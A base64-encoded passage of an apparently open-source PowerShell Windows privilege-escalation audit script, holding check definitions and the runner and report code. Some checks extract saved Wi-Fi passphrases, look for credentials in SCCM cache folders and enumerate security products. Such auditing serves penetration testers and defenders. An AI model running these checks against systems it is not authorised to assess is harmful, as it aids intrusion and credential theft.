Ikxpc3QiLCBGYWxzZSwgRmFsc2UKIkNPTkZJR19NU0kiLCAiIiwgIkludm9rZS1SZWdpc3RyeUFsd2F5c0luc3RhbGxFbGV2YXRlZENoZWNrIiwgIiIsICJDb25maWciLCAiQWx3YXlzSW5zdGFsbEVsZXZhdGVkIiwgIlZ1bG4iLCAiSGlnaCIsICJDaGVjayB3aGV0aGVyIHRoZSAnQWx3YXlzSW5zdGFsbEVsZXZhdGVkJyByZWdpc3RyeSBrZXlzIGFyZSBjb25maWd1cmVkIGFuZCBlbmFibGVkLiBJZiBzbyBhbnkgdXNlciBtaWdodCBiZSBhYmxlIHRvIHJ1biBhcmJpdGFyeSBNU0kgZmlsZXMgd2l0aCBTWVNURU0gcHJpdmlsZWdlcy4iLCAiTGlzdCIsIEZhbHNlLCBGYWxzZQoiQ09ORklHX1dTVVMiLCAiIiwgIkludm9rZS1Xc3VzQ29uZmlnQ2hlY2siLCAiIiwgIkNvbmZpZyIsICJXU1VTIENvbmZpZ3VyYXRpb24iLCAiVnVsbiIsICJIaWdoIiwgIklmIFdTVVMgaXMgaW4gdXNlLCB0aGlzIGNoZWNrIHdpbGwgZGV0ZXJtaW5lIHdoZXRoZXIgb3Igbm90IGl0IHVzZXMgYSBzZWN1cmUgVVJMLiBJZiBub3QsIGl0IG1pZ2h0IGJlIHZ1bG5lcmFibGUgdG8gTWl0TSBhdHRhY2tzIChjLmYuICdXU1VYcGxvaXQnIC8gJ1dTdXNwaWNpb3VzJykuIiwgIkxpc3QiLCBGYWxzZSwgVHJ1ZQoiQ09ORklHX1NDQ00iLCAiIiwgIkludm9rZS1TY2NtQ2FjaGVGb2xkZXJDaGVjayIsICIiLCAiQ29uZmlnIiwgIlNDQ00gQ2FjaGUgRm9sZGVyIiwgIkluZm8iLCAiSW5mbyIsICJDaGVja3Mgd2hldGhlciB0aGUgU0NDTSBjYWNoZSBmb2xkZXIgZXhpc3RzLiBNYW51YWwgaW52ZXN0aWdhdGlvbiBtaWdodCBiZSByZXF1aXJlZCBkdXJpbmcgcG9zdC1leHBsb2l0YXRpb24uIiwgIkxpc3QiLCBUcnVlLCBUcnVlCiJDT05GSUdfU0NDTV9WVUxOIiwgIiIsICJJbnZva2UtU2NjbUNhY2hlRm9sZGVyVnVsbkNoZWNrIiwgIiIsICJDb25maWciLCAiU0NDTSBDYWNoZSBGb2xkZXIiLCAiVnVsbiIsICJNZWRpdW0iLCAiQ2hlY2tzIHdoZXRoZXIgdGhlIGN1cnJlbnQgdXNlciBjYW4gYnJvd3NlIHRoZSBTQ0NNIGNhY2hlIGZvbGRlci4gSWYgc28sIGhhcmRjb2RlZCBjcmVkZW50aWFscyBtaWdodCBiZSBleHRyYWN0ZWQgZnJvbSBNU0kgcGFja2FnZSBmaWxlcyBvciBzY3JpcHRzLiIsICJMaXN0IiwgRmFsc2UsIEZhbHNlCiJORVRfVENQX0VORFBPSU5UUyIsICIiLCAiSW52b2tlLVRjcEVuZHBvaW50c0NoZWNrIiwgIiIsICJOZXR3b3JrIiwgIlRDUCBFbmRwb2ludHMiLCAiSW5mbyIsICJJbmZvIiwgIkxpc3QgYWxsIFRDUCBwb3J0cyB0aGF0IGFyZSBpbiBhIExJU1RFTiBzdGF0ZS4gRm9yIGVhY2ggb25lLCB0aGUgY29ycmVzcG9uZGluZyBwcm9jZXNzIGlzIGFsc28gcmV0dXJuZWQuIiwgIlRhYmxlIiwgVHJ1ZSwgVHJ1ZQoiTkVUX1VEUF9FTkRQT0lOVFMiLCAiIiwgIkludm9rZS1VZHBFbmRwb2ludHNDaGVjayIsICIiLCAiTmV0d29yayIsICJVRFAgRW5kcG9pbnRzIiwgIkluZm8iLCAiSW5mbyIsICJMaXN0IGFsbCBVRFAgcG9ydHMgdGhhdCBhcmUgaW4gYSBMSVNURU4gc3RhdGUuIEZvciBlYWNoIG9uZSwgdGhlIGNvcnJlc3BvbmRpbmcgcHJvY2VzcyBpcyBhbHNvIHJldHVybmVkLiBETlMgaXMgZmlsdGVyZWQgb3V0IHRvIG1pbmltaXplIHRoZSBvdXRwdXQuIiwgIlRhYmxlIiwgVHJ1ZSwgVHJ1ZQoiTkVUX1dMQU4iLCAiIiwgIkludm9rZS1XbGFuUHJvZmlsZXNDaGVjayIsICIiLCAiTmV0d29yayIsICJTYXZlZCBXaWZpIFByb2ZpbGVzIiwgIkluZm8iLCAiSW5mbyIsICJFbnVtZXJhdGUgc2F2ZWQgV2lmaSBwcm9maWxlcyBhbmQgZXh0cmFjdCBjbGVhci10ZXh0IFdFUC9XUEEgcHJlLXNoYXJlZCBrZXlzIGFuZCBwYXNzcGhyYXNlcyAoaWYgYXBwbGljYWJsZSkuIiwgIkxpc3QiLCBUcnVlLCBUcnVlCiJVUERBVEVfSElTVE9SWSIsICIiLCAiSW52b2tlLVdpbmRvd3NVcGRhdGVDaGVjayIsICIiLCAiVXBkYXRlcyIsICJMYXN0IFdpbmRvd3MgVXBkYXRlIERhdGUiLCAiSW5mbyIsICJJbmZvIiwgIkludGVyYWN0IHdpdGggdGhlIFdpbmRvd3MgVXBkYXRlIHNlcnZpY2UgYW5kIGRldGVybWluZSB3aGVuIHRoZSBzeXN0ZW0gd2FzIGxhc3QgdXBkYXRlZC4gTm90ZSB0aGF0IHRoaXMgY2hlY2sgbWlnaHQgYmUgdW5yZWxpYWJsZS4iLCAiVGFibGUiLCBUcnVlLCBUcnVlCiJVUERBVEVfSE9URklYIiwgIiIsICJJbnZva2UtSG90Rml4Q2hlY2siLCAiIiwgIlVwZGF0ZXMiLCAiSW5zdGFsbGVkIFVwZGF0ZXMgYW5kIEhvdGZpeGVzIiwgIkluZm8iLCAiSW5mbyIsICJFbnVtZXJhdGUgdGhlIGluc3RhbGxlZCB1cGRhdGVzIGFuZCBob3RmaXhlcyBieSBwYXJzaW5nIHRoZSByZWdpc3RyeS4gSWYgdGhpcyBmYWlscywgdGhlIGNoZWNrIHdpbGwgZmFsbCBiYWNrIHRvIHRoZSBidWlsdC1pbiAnR2V0LUhvdEZpeCcgY21kbGV0LiIsICJUYWJsZSIsIFRydWUsIFRydWUKIlVQREFURV9IT1RGSVhfVlVMTiIsICIiLCAiSW52b2tlLUhvdEZpeFZ1bG5DaGVjayIsICIiLCAiVXBkYXRlcyIsICJTeXN0ZW0gdXAgdG8gZGF0ZT8iLCAiVnVsbiIsICJNZWRpdW0iLCAiRW51bWVyYXRlIHRoZSBpbnN0YWxsZWQgdXBkYXRlcyBhbmQgaG90Zml4ZXMgYW5kIGNoZWNrIHdoZXRoZXIgYSBwYXRjaCB3YXMgYXBwbGllZCBpbiB0aGUgbGFzdCAzMSBkYXlzLiIsICJMaXN0IiwgRmFsc2UsIFRydWUKIk1JU0NfQVZFRFIiLCAiIiwgIkludm9rZS1FbmRwb2ludFByb3RlY3Rpb25DaGVjayIsICIiLCAiTWlzYyIsICJFbmRwb2ludCBQcm90ZWN0aW9uIiwgIkluZm8iLCAiSW5mbyIsICJFbnVtZXJhdGUgaW5zdGFsbGVkIHNlY3VyaXR5IHByb2R1Y3RzIChBViwgRURSKS4gVGhpcyBjaGVjayBpcyBiYXNlZCBvbiBrZXl3b3JkIG1hdGNoaW5nIChsb2FkZWQgRExMcywgcnVubmluZyBwcm9jZXNzZXMsIGluc3RhbGxlZCBhcHBsaWNhdGlvbnMgYW5kIHJlZ2lzdGVyZWQgc2VydmljZXMpLiIsICJUYWJsZSIsIFRydWUsIFRydWUKIk1JU0NfU1lTSU5GTyIsICIiLCAiSW52b2tlLVN5c3RlbUluZm9DaGVjayIsICIiLCAiTWlzYyIsICJPUyBWZXJzaW9uIiwgIkluZm8iLCAiSW5mbyIsICJQcmludCB0aGUgZGV0YWlsZWQgdmVyc2lvbiBudW1iZXIgb2YgdGhlIE9wZXJhdGluZyBTeXN0ZW0uIElmIHdlIGNhbid0IGdldCB0aGUgdXBkYXRlIGhpc3RvcnksIHRoaXMgbWlnaHQgYmUgdXNlZnVsLiIsICJUYWJsZSIsIFRydWUsIFRydWUKIk1JU0NfQURNSU5TIiwgIiIsICJJbnZva2UtTG9jYWxBZG1pbkdyb3VwQ2hlY2siLCAiIiwgIk1pc2MiLCAiTG9jYWwgQWRtaW4gR3JvdXAiLCAiSW5mbyIsICJJbmZvIiwgIkVudW1lcmF0ZSB0aGUgdXNlcnMgYW5kIGdyb3VwcyB0aGF0IGJlbG9uZyB0byB0aGUgbG9jYWwgJ0FkbWluaXN0cmF0b3JzJyBncm91cC4iLCAiVGFibGUiLCBUcnVlLCBUcnVlCiJNSVNDX0hPTUVTIiwgIiIsICJJbnZva2UtVXNlcnNIb21lRm9sZGVyQ2hlY2siLCAiIiwgIk1pc2MiLCAiVXNlciBIb21lIEZvbGRlcnMiLCAiSW5mbyIsICJJbmZvIiwgIkVudW1lcmF0ZSBsb2NhbCBIT01FIGZvbGRlcnMgYW5kIGNoZWNrIGZvciBwb3RlbnRpYWxseSB3ZWFrIHBlcm1pc3Npb25zLiIsICJUYWJsZSIsIFRydWUsIEZhbHNlCiJNSVNDX01BQ0hJTkVfUk9MRSIsICIiLCAiSW52b2tlLU1hY2hpbmVSb2xlQ2hlY2siLCAiIiwgIk1pc2MiLCAiTWFjaGluZSBSb2xlIiwgIkluZm8iLCAiSW5mbyIsICJTaW1wbHkgcmV0dXJuIHRoZSBtYWNoaW5lJ3Mgcm9sZS4gSXQgY2FuIGJlIGVpdGhlciAnV29ya3N0YXRpb24nLCAnU2VydmVyJyBvciAnRG9tYWluIENvbnRyb2xsZXInLiIsICJUYWJsZSIsIFRydWUsIFRydWUKIk1JU0NfU1RBUlRVUF9FVkVOVFMiLCAiIiwgIkludm9rZS1TeXN0ZW1TdGFydHVwSGlzdG9yeUNoZWNrIiwgIiIsICJNaXNjIiwgIlN5c3RlbSBTdGFydHVwIEhpc3RvcnkiLCAiSW5mbyIsICJJbmZvIiwgIlJldHJpZXZlIHRoZSBtYWNoaW5lJ3Mgc3RhcnR1cCBoaXN0b3J5LiBUaGlzIG1pZ2h0IGJlIHVzZWZ1bCB0byBmaWd1cmUgb3V0IGhvdyBvZnRlbiBhIHNlcnZlciBpcyByZWJvb3RlZC4gSW4gdGhlIGNhc2Ugb2YgYSB3b3Jrc3RhdGlvbiwgc3VjaCBtZXRyaWMgaXNuJ3QgYXMgcmVsZXZhbnQuIiwgIlRhYmxlIiwgVHJ1ZSwgVHJ1ZQoiTUlTQ19TVEFSVFVQX0xBU1QiLCAiIiwgIkludm9rZS1TeXN0ZW1TdGFydHVwQ2hlY2siLCAiIiwgIk1pc2MiLCAiTGFzdCBTeXN0ZW0gU3RhcnR1cCIsICJJbmZvIiwgIkluZm8iLCAiRGV0ZXJtaW5lIHRoZSBsYXN0IHN5c3RlbSBzdGFydHVwIGRhdGUgYW5kIHRpbWUgYmFzZWQgb24gdGhlIGN1cnJlbnQgdGljayBjb3VudC4gTm90ZSB0aGF0IHRoaXMgbWlnaHQgYmUgdW5yZWxpYWJsZS4iLCAiVGFibGUiLCBUcnVlLCBUcnVlCiJNSVNDX0RSSVZFUyIsICIiLCAiSW52b2tlLVN5c3RlbURyaXZlc0NoZWNrIiwgIiIsICJNaXNjIiwgIkZpbGVzeXN0ZW0gRHJpdmVzIiwgIkluZm8iLCAiSW5mbyIsICJMaXN0IHBhcnRpdGlvbnMsIHJlbW92YWJsZSBzdG9yYWdlIGFuZCBtYXBwZWQgbmV0d29yayBzaGFyZXMuIiwgIlRhYmxlIiwgVHJ1ZSwgVHJ1ZQoiQAoKICAgICRBbGxDaGVja3MgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKCiAgICAjIExvYWQgZGVmYXVsdCBjaGVja3MKICAgICRBbGxDaGVja3NDc3YgfCBDb252ZXJ0RnJvbS1Dc3YgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgW3ZvaWRdICRBbGxDaGVja3MuQWRkKCRfKQogICAgfQoKICAgICMgTG9hZCBwbHVnaW5zIGlmIGFueQogICAgV3JpdGUtVmVyYm9zZSAiU2NyaXB0IHBhdGg6ICQoJFNjcmlwdFBhdGgpIgogICAgaWYgKFRlc3QtUGF0aCAkU2NyaXB0UGF0aCkgewogICAgICAgICRTY3JpcHRMb2NhdGlvbiA9IFNwbGl0LVBhdGggLVBhcmVudCAkU2NyaXB0UGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBFcnJvclNwbGl0UGF0aAogICAgICAgIGlmICgtbm90ICRFcnJvclNwbGl0UGF0aCkgewogICAgICAgICAgICAkUHJpdmVzY0NoZWNrUGx1Z2luc0NzdlBhdGggPSBKb2luLVBhdGggJFNjcmlwdExvY2F0aW9uIC1DaGlsZFBhdGggIlxQcml2ZXNjQ2hlY2tQbHVnaW5zXFByaXZlc2NDaGVja1BsdWdpbnMuY3N2IgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJQbHVnaW4gZGVmaW5pdGlvbiBmaWxlOiAnJCgkUHJpdmVzY0NoZWNrUGx1Z2luc0NzdlBhdGgpJyIKICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkUHJpdmVzY0NoZWNrUGx1Z2luc0NzdlBhdGgpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZvdW5kIHBsdWdpbiBkZWZpbml0aW9uIGZpbGU6ICQoJFByaXZlc2NDaGVja1BsdWdpbnNDc3ZQYXRoKSIKICAgICAgICAgICAgICAgIEdldC1Db250ZW50IC1QYXRoICRQcml2ZXNjQ2hlY2tQbHVnaW5zQ3N2UGF0aCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1TdHJpbmcgfCBDb252ZXJ0RnJvbS1Dc3YgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgW3ZvaWRdICRBbGxDaGVja3MuQWRkKCRfKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiTm8gcGx1Z2luIGRlZmluaXRpb24gZmlsZSBmb3VuZC4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAKICAgICMgTG9hZCBwbHVnaW4gc2NyaXB0cyBpZiBhbnkKICAgICRBbGxDaGVja3MgfCBXaGVyZS1PYmplY3QgeyAkXy5GaWxlIC1uZSAiIiB9IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgRmlsZSB8IFNvcnQtT2JqZWN0IC1VbmlxdWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiUGx1Z2luIHJlcXVpcmVkOiAkKCRfKSIKICAgICAgICAkRmlsZVBhdGggPSBKb2luLVBhdGggJFNjcmlwdExvY2F0aW9uIC1DaGlsZFBhdGggIlxQcml2ZXNjQ2hlY2tQbHVnaW5zXCQoJF8pIgogICAgICAgIEdldC1Db250ZW50IC1QYXRoICRGaWxlUGF0aCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1TdHJpbmcgfCBJbnZva2UtRXhwcmVzc2lvbgogICAgfQoKICAgICRDaGVja0NvdW50ZXIgPSAwCiAgICAkQWxsQ2hlY2tzIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAkQ3VycmVudENoZWNrID0gJF8KCiAgICAgICAgIyBHZXQgdGhlICdSdW5JZkFkbWluJyBmbGFnJ3MgdmFsdWUgZnJvbSB0aGUgQ1NWIGRhdGEgCiAgICAgICAgJFJ1bklmQWRtaW4gPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jvb2xlYW4oJEN1cnJlbnRDaGVjay5SdW5JZkFkbWluKQoKICAgICAgICBpZiAoKCRJc0FkbWluIC1hbmQgJFJ1bklmQWRtaW4pIC1vciAoLW5vdCAkSXNBZG1pbikpIHsKCiAgICAgICAgICAgICMgSWYgdGhlIGN1cnJlbnQgdXNlciBpcyBhbiBhZG1pbiwgcnVuIHRoZSBjaGVjayBvbmx5IGl0ICdSdW5JZkFkbWluJyBpcyB0cnVlLgogICAgICAgICAgICAjIElmIHRoZSBjdXJyZW50IHVzZXIgaXMgYSBub3JtYWwgdXNlciwgc2ltcGx5IHJ1biB0aGUgY2hlY2suCgogICAgICAgICAgICAjIEdldCB0aGUgJ0V4dGVuZGVkJyBmbGFnJ3MgdmFsdWUgZnJvbSB0aGUgQ1NWIGRhdGEKICAgICAgICAgICAgJEV4dGVuZGVkQ2hlY2sgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jvb2xlYW4oJEN1cnJlbnRDaGVjay5FeHRlbmRlZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgkRXh0ZW5kZWQgLW9yICgoLW5vdCAkRXh0ZW5kZWQpIC1hbmQgKC1ub3QgJEV4dGVuZGVkQ2hlY2spKSkgewoKICAgICAgICAgICAgICAgICMgSWYgdGhlICdFeHRlbmRlZCcgb3B0aW9uIHdhcyBzcGVjaWZpZWQsIHJ1biB0aGUgY2hlY2suIAogICAgICAgICAgICAgICAgIyBJZiB0aGUgJ0V4dGVuZGVkJyBvcHRpb24gd2FzIG5vdCBzcGVjaWZpZWQsIHJ1biB0aGUgY2hlY2sgb25seSBpZiBpcyBpcyBub3QKICAgICAgICAgICAgICAgICMgbWFya2VkIGFzIGFuICJFeHRlbmRlZCIgb25lLgoKICAgICAgICAgICAgICAgIGlmICgkU2lsZW50KSB7CgogICAgICAgICAgICAgICAgICAgICMgSWYgdGhlICdTaWxlbnQnIG9wdGlvbiB3YXMgc3BlY2lmaWVkLCBkb24ndCBwcmludCB0aGUgb3V0cHV0IG9mIHRoZSBjaGVjayBidXQKICAgICAgICAgICAgICAgICAgICAjIHdyaXRlIGEgcHJvZ3Jlc3MgYmFyIGFuZCBzaG93IHRoZSBuYW1lIG9mIHRoZSBjaGVjayB0aGF0IGlzIGJlaW5nIHJ1bi4KCiAgICAgICAgICAgICAgICAgICAgJENoZWNrQ291bnRlciArPSAxCiAgICAgICAgICAgICAgICAgICAgJFBlcmNlbnRhZ2UgPSAoJENoZWNrQ291bnRlciAqIDEwMCkgLyAoJEFsbENoZWNrcy5Db3VudCkKICAgICAgICAgICAgICAgICAgICBXcml0ZS1Qcm9ncmVzcyAtQWN0aXZpdHkgIiQoJEN1cnJlbnRDaGVjay5DYXRlZ29yeS5Ub1VwcGVyKCkpID4gJCgkQ3VycmVudENoZWNrLkRpc3BsYXlOYW1lKSIgLVBlcmNlbnRDb21wbGV0ZSAkUGVyY2VudGFnZQogICAgICAgICAgICAgICAgICAgICRDaGVja1Jlc3VsdCA9IEludm9rZS1DaGVjayAtQ2hlY2sgJEN1cnJlbnRDaGVjawoKICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICMgSWYgdGhlICdTaWxlbnQnIG9wdGlvbiB3YXMgbm90IHNwZWNpZmllZCwgcHJpbnQgYSBiYW5uZXIgdGhhdCBzaG93cyBzb21lIAogICAgICAgICAgICAgICAgICAgICMgaW5mb3JtYXRpb24gYWJvdXQgdGhlIGN1cnJlbnQgY2hlY2suIFRoZW4sIHJ1biB0aGUgY2hlY2sgYW5kIHByaW50IHRoZSAKICAgICAgICAgICAgICAgICAgICAjIG91dHB1dCBlaXRoZXIgYXMgYSB0YWJsZSBvciBhIGxpc3QsIGRlcGVuZGluZyBvbiB0aGUgJ0Zvcm1hdCcgdmFsdWUgaW4KICAgICAgICAgICAgICAgICAgICAjIHRoZSBDU1YgZGF0YS4KCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtQ2hlY2tCYW5uZXIgLUNoZWNrICRDdXJyZW50Q2hlY2sKICAgICAgICAgICAgICAgICAgICAkQ2hlY2tSZXN1bHQgPSBJbnZva2UtQ2hlY2sgLUNoZWNrICRDdXJyZW50Q2hlY2sKICAgICAgICAgICAgICAgICAgICBXcml0ZS1DaGVja1Jlc3VsdCAtQ2hlY2tSZXN1bHQgJENoZWNrUmVzdWx0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgIyBQcmludCBhIHJlcG9ydCBvbiB0aGUgdGVybWluYWwgYXMgYW4gJ0FTQ0lJLWFydCcgdGFibGUgd2l0aCBjb2xvcnMgdXNpbmcgJ1dyaXRlLUhvc3QnLgogICAgIyBUaGVyZWZvcmUsIHRoaXMgd2lsbCBiZSBvbmx5IHZpc2libGUgaWYgcnVuIGZyb20gYSAncmVhbCcgdGVybWluYWwuCiAgICBXcml0ZS1Qcml2ZXNjQ2hlY2tBc2NpaVJlcG9ydAoKICAgICMgSWYgdGhlICdSZXBvcnQnIG9wdGlvbiB3YXMgc3BlY2lmaWVkLCB3cml0ZSBhIHJlcG9ydCB0byBhIGZpbGUgdXNpbmcgdGhlIHZhbHVlIG9mIHRoaXMgCiAgICAjIHBhcmFtZXRlciBhcyB0aGUgYmFzZW5hbWUgKG9yIHBhdGggKyBiYXNlbmFtZSkuIFRoZSBleHRlbnNpb24gaXMgdGhlbiBkZXRlcm1pbmVkIGJhc2VkIAogICAgIyBvbiB0aGUgY2hvc2VuIGZvcm1hdChzKS4KICAgIGlmICgkUmVwb3J0KSB7CgogICAgICAgIGlmICgtbm90ICRGb3JtYXQpIHsKCiAgICAgICAgICAgICMgSWYgYSBmb3JtYXQgb3IgYSBmb3JtYXQgbGlzdCB3YXMgbm90IHNwZWNpZmllZCwgZGVmYXVsdCB0byB0aGUgVFhUIGZvcm1hdC4KCiAgICAgICAgICAgIFtzdHJpbmdbXV0gJEZvcm1hdCA9ICJUWFQiCiAgICAgICAgfQoKICAgICAgICAkRm9ybWF0IHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgIyBGb3IgZWFjaCBmb3JtYXQsIGJ1aWxkIHRoZSBuYW1lIG9mIHRoZSBvdXRwdXQgcmVwb3J0IGZpbGUgYXMgQkFTRU5BTUUgKyAuICsgRVhULgogICAgICAgICAgICAjIFRoZW4gZ2VuZXJhdGUgdGhlIHJlcG9ydCBjb3JyZXNwb25kaW5nIHRvIHRoZSBjdXJyZW50IGZvcm1hdCBhbmQgd3JpdGUgaXQgdG8gYSAKICAgICAgICAgICAgIyBmaWxlIHVzaW5nIHRoZSBwcmV2aW91c2x5IGZvcm1hdHRlZCBmaWxlbmFtZS4KCiAgICAgICAgICAgICRSZXBvcnRGaWxlTmFtZSA9ICIkKCRSZXBvcnQuVHJpbSgpKS4kKCRfLlRvTG93ZXIoKSkiCiAgICAgICAgICAgIGlmICgkXyAtZXEgIlRYVCIpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVR4dFJlcG9ydCAtQWxsUmVzdWx0cyAkUmVzdWx0QXJyYXlMaXN0IHwgT3V0LUZpbGUgJFJlcG9ydEZpbGVOYW1lCiAgICAgICAgICAgIH0gZWxzZWlmICgkXyAtZXEgIkhUTUwiKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1IdG1sUmVwb3J0IC1BbGxSZXN1bHRzICRSZXN1bHRBcnJheUxpc3QgfCBPdXQtRmlsZSAkUmVwb3J0RmlsZU5hbWUKICAgICAgICAgICAgfSBlbHNlaWYgKCRfIC1lcSAiQ1NWIikgewogICAgICAgICAgICAgICAgV3JpdGUtQ3N2UmVwb3J0IC1BbGxSZXN1bHRzICRSZXN1bHRBcnJheUxpc3QgfCBPdXQtRmlsZSAkUmVwb3J0RmlsZU5hbWUKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgImByYG5SZXBvcnQgZm9ybWF0IG5vdCBpbXBsZW1lbnRlZDogJCgkRm9ybWF0LlRvVXBwZXIoKSlgcmBuIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgICMgSWYgdGhlICdFeHRlbmRlZCcgbW9kZSB3YXMgbm90IHNwZWNpZmllZCwgcHJpbnQgYSB3YXJuaW5nIG1lc3NhZ2UsIHVubGVzcyB0aGUgJ0ZvcmNlJyAKICAgICMgcGFyYW1ldGVyIHdhcyBzcGVjaWZpZWQuCiAgICBpZiAoKC1ub3QgJEV4dGVuZGVkKSAtYW5kICgtbm90ICRGb3JjZSkgLWFuZCAoLW5vdCAkU2lsZW50KSkgewoKICAgICAgICBXcml0ZS1XYXJuaW5nICJUbyBnZXQgbW9yZSBpbmZvLCBydW4gdGhpcyBzY3JpcHQgd2l0aCB0aGUgb3B0aW9uICctRXh0ZW5kZWQnLiIKICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLUNoZWNrIHsKCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICBbb2JqZWN0XSRDaGVjawogICAgKQoKICAgICRSZXN1bHQgPSBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAiJCgkQ2hlY2suQ29tbWFuZCkgJCgkQ2hlY2suUGFyYW1zKSIKICAgICRDaGVjayB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJlc3VsdFJhdyIgLVZhbHVlICRSZXN1bHQKICAgICRDaGVjayB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJlc3VsdFJhd1N0cmluZyIgLVZhbHVlICQoJFJlc3VsdCB8IEZvcm1hdC1MaXN0IHwgT3V0LVN0cmluZykKCiAgICBpZiAoJCgkQ2hlY2suVHlwZSAtTGlrZSAidnVsbiIpKSB7CiAgICAgICAgaWYgKCRSZXN1bHQpIHsKICAgICAgICAgICAgJENoZWNrIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQ29tcGxpYW5jZSIgLVZhbHVlICJLTyIKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkQ2hlY2suU2V2ZXJpdHkgPSAiTm9uZSIKICAgICAgICAgICAgJENoZWNrIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQ29tcGxpYW5jZSIgLVZhbHVlICJPSyIKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgICRDaGVjayB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkNvbXBsaWFuY2UiIC1WYWx1ZSAiTi9BIgogICAgICAgIGlmICgtbm90ICRSZXN1bHQpIHsKICAgICAgICAgICAgJENoZWNrLlNldmVyaXR5ID0gIk5vbmUiCiAgICAgICAgfQogICAgfQogICAgW3ZvaWRdICRSZXN1bHRBcnJheUxpc3QuQWRkKCRDaGVjaykKICAgICRDaGVjawp9CgpmdW5jdGlvbiBXcml0ZS1DaGVja0Jhbm5lciB7CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgW29iamVjdF0kQ2hlY2sKICAgICkKCiAgICBmdW5jdGlvbiBTcGxpdC1EZXNjcmlwdGlvbiB7CiAgICAgICAgcGFyYW0oW3N0cmluZ10kRGVzY3JpcHRpb24pCgogICAgICAgICREZXNjcmlwdGlvblNwbGl0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAgICAgJFRlbXBPbGQgPSAiIgogICAgICAgICRUZW1wTmV3ID0gIiIKICAgICAgICAkRGVzY3JpcHRpb24uU3BsaXQoJyAnKSB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgICRUZW1wTmV3ID0gIiQoJFRlbXBPbGQpICQoJF8pIi5UcmltKCkKICAgICAgICAgICAgaWYgKCRUZW1wTmV3Lkxlbmd0aCAtZ3QgNTMpIHsKICAgICAgICAgICAgICAgIFt2b2lkXSREZXNjcmlwdGlvblNwbGl0LkFkZCgkVGVtcE9sZCkKICAgICAgICAgICAgICAgICRUZW1wT2xkID0gIiQoJF8pIgogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJFRlbXBPbGQgPSAkVGVtcE5ldwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkVGVtcE9sZCkgewogICAgICAgICAgICBbdm9pZF0kRGVzY3JpcHRpb25TcGxpdC5BZGQoJFRlbXBPbGQpCiAgICAgICAgfQogICAgICAgICREZXNjcmlwdGlvblNwbGl0CiAgICB9CgogICAgJFRpdGxlID0gIiQoJENoZWNrLkNhdGVnb3J5LlRvVXBwZXIoKSkgPiAkKCRDaGVjay5EaXNwbGF5TmFtZSkiCiAgICBpZiAoJFRpdGxlLkxlbmd0aCAtZ3QgNDYpIHsKICAgICAgICB0aHJvdyAiSW5wdXQgdGl0bGUgaXMgdG9vIGxvbmcuIgogICAgfQoKICAgICRSZXN1bHQgPSAiIgogICAgJFJlc3VsdCArPSAiKy0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rLS0tLS0tK2ByYG4iCiAgICAkUmVzdWx0ICs9ICJ8IFRFU1QgfCAkVGl0bGUkKCcgJyooNDYgLSAkVGl0bGUuTGVuZ3RoKSkgfCAkKCRDaGVjay5UeXBlLlRvVXBwZXIoKSkgfGByYG4iCiAgICAkUmVzdWx0ICs9ICIrLS0tLS0tKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0rYHJgbiIKICAgIFNwbGl0LURlc2NyaXB0aW9uIC1EZXNjcmlwdGlvbiAkQ2hlY2suRGVzY3JpcH